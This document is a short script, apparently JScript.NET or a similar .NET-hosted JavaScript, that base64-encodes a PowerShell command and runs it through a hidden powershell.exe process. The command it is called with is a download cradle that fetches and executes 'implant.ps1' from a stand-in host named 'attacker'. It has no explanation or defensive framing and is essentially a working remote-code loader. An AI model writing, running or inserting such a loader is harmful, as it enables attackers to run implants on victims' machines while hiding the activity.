(function(psCode) {
    var b64 = System.Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(psCode));
    var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", "-EncodedCommand " + b64);
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.CreateNoWindow = true;
    var p = System.Diagnostics.Process.Start(psi);
    var output = p.StandardOutput.ReadToEnd();
    var error = p.StandardError.ReadToEnd();
    p.WaitForExit();
    return output + error;
})("IEX (New-Object Net.WebClient).DownloadString('http://attacker/implant.ps1')")
